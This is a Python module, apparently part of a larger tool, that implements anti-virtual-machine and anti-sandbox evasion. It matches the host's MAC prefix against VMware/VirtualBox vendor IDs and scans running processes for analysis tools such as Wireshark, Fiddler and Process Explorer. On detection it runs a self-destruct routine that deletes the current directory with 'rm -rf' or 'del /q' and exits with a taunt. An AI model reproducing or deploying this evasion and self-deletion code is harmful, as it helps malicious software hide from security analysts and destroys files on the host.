#! encoding:utf-8

import sys,getmac,os
from system_manager import get_os
""" 
TODO:时间差检测技术
DONE:虚拟机自杀程序 
"""

def check_vm_in_MAC():
    '''根据当前主机MAC地址判断是否为虚拟机调试环境，如果是返回True'''
    vm_macs = ['080027','000569','000C29','001C14','005056','001C42','00163E','0A0027']

    mac = getmac.get_mac_address().split(':')
    mac = mac[0]+mac[1]+mac[2]
    mac = mac.upper()
    for macs in vm_macs:
        if mac == macs:
            return True

def check_sandbox_in_process():
    '''检测是否存在虚拟机进程，存在返回True，不存在返回False'''
    EvidenceOfSandbox = []
    sandbox_processes = "vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler", "vmware", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs", "vmtoolsd"
    runningProcess = []
    if '/bin/tasklist' in os.popen('which tasklist').read():
        for item in os.popen("tasklist").read().splitlines()[4:]:
            runningProcess.append(item.split())
    if os.popen('which tasklist').read() == '' or os.popen('which tasklist').read() == 'tasklist not found':
        for item in os.popen("ps -ef").read().splitlines()[4:]:
            runningProcess.append(item.split())
    for process in runningProcess:
        for sandbox_process in sandbox_processes:
            if sandbox_process in process:
                if process not in EvidenceOfSandbox:
                    EvidenceOfSandbox.append(process)
                    break

    if not EvidenceOfSandbox:
        return False
    else:
        return True

def kill_self():
    """ 自杀程序，全部清空 """
    lib_dic=os.getcwd()
    if get_os()=='linux' or get_os()=='macos':
        os.system("rm -rf {}".format(lib_dic))
    elif get_os()=='windows':
        os.system('del /q {}'.format(lib_dic))


def un_vm():
    '''反虚拟机主函数'''
    if check_vm_in_MAC()==1 or check_sandbox_in_process()==1:
        print("The program detects that it is currently in a virtual machine or debugging environment and automatically exits\
               \nIn short: don’t play tricks")
        kill_self()
        sys.exit(0)
    else:
        pass
if __name__ == "__main__":
    print os.getcwd()